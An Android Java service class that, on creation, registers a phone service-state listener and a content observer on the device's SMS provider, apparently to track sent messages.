package com.mtarget.pecadom;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class SimReadyService extends Service {
	private final IBinder mBinder=new SimReadyBinder();
	private boolean app_demarre=false;
	private SmsSentObserver smsSentObserver = null;
	private TelephoneConnectListener telephoneConnectListener_service;
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		System.out.println("SimReadyServiceCreate");
		if(!app_demarre){
			TelephonyManager telephonyManager_service=(TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			telephoneConnectListener_service=new TelephoneConnectListener(SimReadyService.this, telephonyManager_service);
			telephonyManager_service.listen(telephoneConnectListener_service, PhoneStateListener.LISTEN_SERVICE_STATE);
			
			smsSentObserver = new SmsSentObserver(new Handler(), getApplicationContext());
		    getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
			
			app_demarre=true;
		}
	}
	
	public TelephoneConnectListener get_telephoneConnectListener(){
		return telephoneConnectListener_service;
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return mBinder;
	}
	
	@Override
	public boolean onUnbind(Intent intent) {
		// TODO Auto-generated method stub
		return super.onUnbind(intent);
	}
	
	
	public class SimReadyBinder extends Binder{
		SimReadyService getService(){
			return SimReadyService.this;
		}
	}
}